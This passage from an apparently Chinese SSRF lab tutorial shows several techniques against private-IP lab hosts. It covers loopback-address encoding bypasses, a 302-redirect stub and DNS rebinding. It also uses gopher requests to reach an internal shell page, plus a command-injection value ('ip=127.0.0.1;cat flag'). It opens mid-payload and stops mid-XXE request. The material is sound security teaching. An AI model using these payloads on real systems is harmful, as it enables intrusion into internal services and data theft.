class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">61</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span><br></code></pre></td></tr></table></figure>

<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423013853782.png" srcset="/img/loading.gif" lazyload alt="image-20250423013853782"></p>
<h2 id="SSRF绕过"><a href="#SSRF绕过" class="headerlink" title="SSRF绕过"></a>SSRF绕过</h2><h3 id="SSRF之回环地址绕过"><a href="#SSRF之回环地址绕过" class="headerlink" title="SSRF之回环地址绕过"></a>SSRF之回环地址绕过</h3><p>如下页面要求访问本地的<code>flag.php</code>文件，但会发现<code>127.0.0.1</code>被过滤了</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//127.0.0.1/flag.php</span><br></code></pre></td></tr></table></figure>

<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423131511681.png" srcset="/img/loading.gif" lazyload alt="image-20250423131511681"></p>
<h4 id="其他进制绕过"><a href="#其他进制绕过" class="headerlink" title="其他进制绕过"></a>其他进制绕过</h4><p>当<code>127.0.0.1</code>被限制时，可以将其进行变形显示，使用其他进制进行绕过</p>
<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>							点分十进制<br><span class="hljs-number">01111111000000000000000000000001</span>	数据包中实际是<span class="hljs-number">32</span>位bit二进制，没有点<br><span class="hljs-number">0b01111111000000000000000000000001</span>	二进制<br><span class="hljs-number">017700000001</span>						八进制<br><span class="hljs-number">0x7F000001</span>							十六进制<br><span class="hljs-number">2130706433</span>							十进制（连续）<br></code></pre></td></tr></table></figure>

<p>实际应用</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 点分十进制</span><br>http:<span class="hljs-comment">//127.0.0.1/flag.php</span><br><span class="hljs-comment"># 二进制</span><br>http:<span class="hljs-comment">//0b01111111000000000000000000000001/flag.php</span><br><span class="hljs-comment"># 八进制</span><br>http:<span class="hljs-comment">//017700000001/flag.php</span><br><span class="hljs-comment"># 点分八进制</span><br>http:<span class="hljs-comment">//0177.0000.0000.0001/flag.php</span><br><span class="hljs-comment"># 十六进制</span><br>http:<span class="hljs-comment">//0xF000001/flag.php</span><br><span class="hljs-comment"># 点分十六进制</span><br>http:<span class="hljs-comment">//0x7F.0x00.0x00.0x01/flag.php</span><br>http:<span class="hljs-comment">//0x7F.0.0.1/flag.php</span><br><span class="hljs-comment"># 三十二进制</span><br>http:<span class="hljs-comment">//01111111000000000000000000000001/flag.php</span><br><span class="hljs-comment"># 十进制</span><br>http:<span class="hljs-comment">//2130706433/flag.php</span><br></code></pre></td></tr></table></figure>

<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423132338626.png" srcset="/img/loading.gif" lazyload alt="image-20250423132338626"></p>
<h3 id="SSRF之302重定向绕过"><a href="#SSRF之302重定向绕过" class="headerlink" title="SSRF之302重定向绕过"></a>SSRF之302重定向绕过</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>攻击者访问SSRF服务器（如<code>http://home.ctf.com:7777</code>），SSRF服务器解析访问公网web服务器（有公网IP的服务器，可以对域名解析的web服务器），然后这台服务器返回重定向302到127.0.0.1给SSRF服务器，这可以绕过我们想要提交的受限制的地址，然后SSRF服务器访问本地127.0.0.1，并且把结果返回给攻击者</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423132638267.png" srcset="/img/loading.gif" lazyload alt="image-20250423132638267"></p>
<h4 id="构建302重定向代码"><a href="#构建302重定向代码" class="headerlink" title="构建302重定向代码"></a>构建302重定向代码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: http://127.0.0.1/flag.php&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>在有公网IP的VPS上创建一个文件写入上面的代码</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423135138756.png" srcset="/img/loading.gif" lazyload alt="image-20250423135138756"></p>
<p>然后使用命令监听7777端口</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">php -S 0.0.0.0:7777<br></code></pre></td></tr></table></figure>

<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423135214639.png" srcset="/img/loading.gif" lazyload alt="image-20250423135214639"></p>
<p>在靶场随便访问一个内网地址</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//192.168.1.151:7777/index.php</span><br></code></pre></td></tr></table></figure>

<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423134019306.png" srcset="/img/loading.gif" lazyload alt="image-20250423134019306"></p>
<p>这里无法回显，因为禁用了访问内网IP</p>
<p>可以通过访问刚才的VPS的代码文件，从而返回重定向302到127.0.0.1给SSRF服务器，然后SSRF服务器访问本地127.0.0.1，并且把结果返回给我们</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//&lt;VPS的IP&gt;/302.php</span><br></code></pre></td></tr></table></figure>

<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423135501357.png" srcset="/img/loading.gif" lazyload alt="image-20250423135501357"></p>
<h3 id="SSRF之DNS重绑定绕过"><a href="#SSRF之DNS重绑定绕过" class="headerlink" title="SSRF之DNS重绑定绕过"></a>SSRF之DNS重绑定绕过</h3><p>针对SSRF漏洞的防御</p>
<ul>
<li>解析目标URL，获取其Host</li>
<li>解析Host，获取Host指向的IP地址</li>
<li>检查IP地址是否为内网地址</li>
<li>请求URL</li>
<li>如果有跳转，拿出跳转URL，执行1</li>
</ul>
<p>可以有效限制以下内容</p>
<ul>
<li>直接访问内网IP</li>
<li>302跳转</li>
<li>xip.io&#x2F;xip.name及短链接变换等URL变形</li>
<li>畸形URL</li>
<li><code>iframe</code>攻击</li>
<li>IP进制转换</li>
</ul>
<p>但是无法防御DNS重绑定攻击</p>
<h4 id="SSRF防御模式"><a href="#SSRF防御模式" class="headerlink" title="SSRF防御模式"></a>SSRF防御模式</h4><p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/1737183472115-1fe2ee10-c532-44bb-b5d8-ac7569a5c703.webp" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<ul>
<li>在用户浏览器输入URL，客户端获取输入的URL，从该URL里提取Host（IP地址，可能是IP地址，也可能是域名）</li>
<li>如果提取到的Host是域名，对该Host进行DNS解析，从而获取到解析的IP地址</li>
<li>判断获取到的IP地址是合法的还是非法的（如是否是私有IP等），如果是非法的，直接返回内容</li>
<li>如果检测到IP地址是合法的，就会执行服务端请求URL（curl的阶段发包），这里再进行一次DNS解析</li>
</ul>
<p>两次DNS解析</p>
<ul>
<li>**第一次DNS解析：**是对URL的Host进行DNS解析</li>
<li>**第二次DNS解析：**使用curl发包时候进行DNS解析</li>
</ul>
<p>漏洞是在第二次DNS解析时形成的，可以利用两次DNS解析的时间差进行绕过</p>
<h4 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h4><p>利用服务器两次解析同一域名的短暂间隙，更换域名背后的IP，达到突破同源策略或过WAF进行SSRF的目的</p>
<p><strong>第一次DNS解析时检测URL的，第二次DNS解析是真正去访问，在第一次使其获取的是一个假的IP地址，在第二次时获取到一个回环地址，这就可以绕过WAF的限制，进行SSRF</strong></p>
<p>缓存是与DNS中的机制TTL有关：域名和IP绑定关系的Cache存活的最长时间</p>
<p>TTL最理想的设置是0，即在第一次解析后，立马换位我们想要访问的内网IP，有些公共DNS服务器还是会把记录进行缓存</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423141417741.png" srcset="/img/loading.gif" lazyload alt="image-20250423141417741"></p>
<p>可以使TTL值为0的网站：<a target="_blank" rel="noopener" href="https://lock.cmpxchg8b.com/rebinder.html">https://lock.cmpxchg8b.com/rebinder.html</a></p>
<p>下面俩的私网和公网IP可以调换</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423142122121.png" srcset="/img/loading.gif" lazyload alt="image-20250423142122121"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://deb74166.7f000001.rbndr.us/flag.php<br></code></pre></td></tr></table></figure>

<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423142207456.png" srcset="/img/loading.gif" lazyload alt="image-20250423142207456"></p>
<h2 id="SSRF进行其他漏洞利用"><a href="#SSRF进行其他漏洞利用" class="headerlink" title="SSRF进行其他漏洞利用"></a>SSRF进行其他漏洞利用</h2><h3 id="使用SSRF进行命令执行"><a href="#使用SSRF进行命令执行" class="headerlink" title="使用SSRF进行命令执行"></a>使用SSRF进行命令执行</h3><p>前提是已经通过前面学习的三个伪协议成功查找到内网存活的主机、开放的端口、并且通过目录扫描出一个存在命令执行漏洞的页面，如下获取的<code>shell.php</code>存在命令执行漏洞</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//172.250.250.4/shell.php</span><br></code></pre></td></tr></table></figure>

<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423143421393.png" srcset="/img/loading.gif" lazyload alt="image-20250423143421393"></p>
<h4 id="使用http伪协议进行GET提交"><a href="#使用http伪协议进行GET提交" class="headerlink" title="使用http伪协议进行GET提交"></a>使用<code>http</code>伪协议进行GET提交</h4><p>这个页面可以通过提交GET参数<code>cmd</code>进行命令执行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://172.250.250.4/shell.php?cmd=<span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure>

<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423143712002.png" srcset="/img/loading.gif" lazyload alt="image-20250423143712002"></p>
<h4 id="使用gopher伪协议进行GET提交"><a href="#使用gopher伪协议进行GET提交" class="headerlink" title="使用gopher伪协议进行GET提交"></a>使用<code>gopher</code>伪协议进行GET提交</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/shell.php?cmd=ls</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>172.250.250.4<br><br></code></pre></td></tr></table></figure>

<p>首先进行抓包</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">gopher:</span><span class="hljs-comment">//172.250.250.4:80/_</span><br></code></pre></td></tr></table></figure>

<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423144503637.png" srcset="/img/loading.gif" lazyload alt="image-20250423144503637"></p>
<p>放入重放器进行两次URL编码</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423144744986.png" srcset="/img/loading.gif" lazyload alt="image-20250423144744986"></p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423144822738.png" srcset="/img/loading.gif" lazyload alt="image-20250423144822738"></p>
<p>发送请求</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423144920889.png" srcset="/img/loading.gif" lazyload alt="image-20250423144920889"></p>
<h4 id="使用gopher伪协议进行POST提交"><a href="#使用gopher伪协议进行POST提交" class="headerlink" title="使用gopher伪协议进行POST提交"></a>使用<code>gopher</code>伪协议进行POST提交</h4><p>使用<code>http</code>伪协议访问漏洞网站</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//172.250.250.5/</span><br></code></pre></td></tr></table></figure>

<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423145354279.png" srcset="/img/loading.gif" lazyload alt="image-20250423145354279"></p>
<p>可以使用bp抓包获取参数</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423145650718.png" srcset="/img/loading.gif" lazyload alt="image-20250423145650718"></p>
<p>进而构造POC</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>172.250.250.5<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>12<br><br><span class="language-abnf"><span class="hljs-attribute">ip</span><span class="hljs-operator">=</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span></span><br></code></pre></td></tr></table></figure>

<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423150006536.png" srcset="/img/loading.gif" lazyload alt="image-20250423150006536"></p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423150619955.png" srcset="/img/loading.gif" lazyload alt="image-20250423150619955"></p>
<p>这里返回的结果要在源码中查看</p>
<p>然后就可以构造执行命令的POC，要注意修改长度</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>172.250.250.5<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>15<br><br><span class="language-abnf"><span class="hljs-attribute">ip</span><span class="hljs-operator">=</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-comment">;ls</span></span><br></code></pre></td></tr></table></figure>

<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423150923178.png" srcset="/img/loading.gif" lazyload alt="image-20250423150923178"></p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>172.250.250.5<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>21<br><br><span class="language-abnf"><span class="hljs-attribute">ip</span><span class="hljs-operator">=</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-comment">;cat flag</span></span><br></code></pre></td></tr></table></figure>

<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423151424717.png" srcset="/img/loading.gif" lazyload alt="image-20250423151424717"></p>
<h3 id="使用SSRF进行XXE"><a href="#使用SSRF进行XXE" class="headerlink" title="使用SSRF进行XXE"></a>使用SSRF进行XXE</h3><h4 id="审计源代码"><a href="#审计源代码" class="headerlink" title="审计源代码"></a>审计源代码</h4><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//172.250.250.6/</span><br></code></pre></td></tr></table></figure>

<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250509202417016.png" srcset="/img/loading.gif" lazyload alt="image-20250509202417016"></p>
<p>查看源代码，核心代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">doLogin</span>(<span class="hljs-params"></span>)</span>&#123;<br>	<span class="hljs-keyword">var</span> username = $(<span class="hljs-string">&quot;#username&quot;</span>).<span class="hljs-title function_ invoke__">val</span>();<br>	<span class="hljs-keyword">var</span> password = $(<span class="hljs-string">&quot;#password&quot;</span>).<span class="hljs-title function_ invoke__">val</span>();<br>	<span class="hljs-keyword">if</span>(username == <span class="hljs-string">&quot;&quot;</span> || password == <span class="hljs-string">&quot;&quot;</span>)&#123;<br>		<span class="hljs-title function_ invoke__">alert</span>(<span class="hljs-string">&quot;用户名或密码不为空&quot;</span>);<br>		<span class="hljs-keyword">return</span>;<br>	&#125;<br>	<br>	<span class="hljs-keyword">var</span> data = <span class="hljs-string">&quot;&lt;user&gt;&lt;username&gt;&quot;</span> + username + <span class="hljs-string">&quot;&lt;/username&gt;&lt;password&gt;&quot;</span> + password + <span class="hljs-string">&quot;&lt;/password&gt;&lt;/user&gt;&quot;</span>; <br>    $.<span class="hljs-title function_ invoke__">ajax</span>(&#123;<br>        <span class="hljs-attr">type</span>: <span class="hljs-string">&quot;POST&quot;</span>,<br>        <span class="hljs-attr">url</span>: <span class="hljs-string">&quot;doLogin.php&quot;</span>,<br>        <span class="hljs-attr">contentType</span>: <span class="hljs-string">&quot;application/xml;charset=utf-8&quot;</span>,<br>        <span class="hljs-attr">data</span>: data,<br>        <span class="hljs-attr">dataType</span>: <span class="hljs-string">&quot;xml&quot;</span>,<br>        <span class="hljs-attr">anysc</span>: <span class="hljs-literal">false</span>,<br>        <span class="hljs-attr">success</span>: function (result) &#123;<br>        	<span class="hljs-keyword">var</span> code = result.<span class="hljs-title function_ invoke__">getElementsByTagName</span>(<span class="hljs-string">&quot;code&quot;</span>)[<span class="hljs-number">0</span>].childNodes[<span class="hljs-number">0</span>].nodeValue;<br>        	<span class="hljs-keyword">var</span> msg = result.<span class="hljs-title function_ invoke__">getElementsByTagName</span>(<span class="hljs-string">&quot;msg&quot;</span>)[<span class="hljs-number">0</span>].childNodes[<span class="hljs-number">0</span>].nodeValue;<br>        	<span class="hljs-keyword">if</span>(code == <span class="hljs-string">&quot;0&quot;</span>)&#123;<br>                <span class="hljs-title function_ invoke__">swal</span>(<span class="hljs-string">&quot;登录失败&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;error&quot;</span>);<br>        	&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(code == <span class="hljs-string">&quot;1&quot;</span>)&#123;<br>                <span class="hljs-title function_ invoke__">swal</span>(<span class="hljs-string">&quot;登录成功&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;success&quot;</span>);<br>        	&#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-title function_ invoke__">swal</span>(<span class="hljs-string">&quot;系统错误&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;success&quot;</span>);<br>        	&#125;<br>        &#125;,<br>    &#125;); <br>&#125;<br></code></pre></td></tr></table></figure>

<p>从代码中可以发现，在<code>doLogin()</code>这个函数中，我们提交的用户名和密码会被拼接进如下代码中</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">var</span> data = <span class="hljs-string">&quot;&lt;user&gt;&lt;username&gt;&quot;</span> + username + <span class="hljs-string">&quot;&lt;/username&gt;&lt;password&gt;&quot;</span> + password + <span class="hljs-string">&quot;&lt;/password&gt;&lt;/user&gt;&quot;</span>; <br></code></pre></td></tr></table></figure>

<p>这是一个典型的XML语言构造方式，然后是进行的POST提交，提交给<code>doLogin.php</code>，还要注意格式类型是xml的</p>
<h4 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h4><p>先构造一个简单的，提交用户名和密码都是admin</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/doLogin.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>172.250.250.6<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/xml;charset=utf-8<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>66<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span 